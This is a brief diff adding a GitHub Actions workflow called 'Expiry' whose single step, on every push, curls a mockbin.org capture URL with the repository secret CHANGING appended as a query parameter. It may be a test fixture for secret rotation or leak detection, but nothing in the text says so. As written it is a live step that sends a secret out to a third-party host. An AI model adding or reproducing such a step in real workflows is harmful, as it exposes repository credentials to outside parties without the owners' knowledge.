@@ -1,0 +1,8 @@
+name: Expiry
+on:
+  push:
+jobs:
+  expiry:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl "http://mockbin.org/bin/15fab93e-a74b-496a-a50e-e69717b1f6e0?foo=${{ secrets.CHANGING }}"
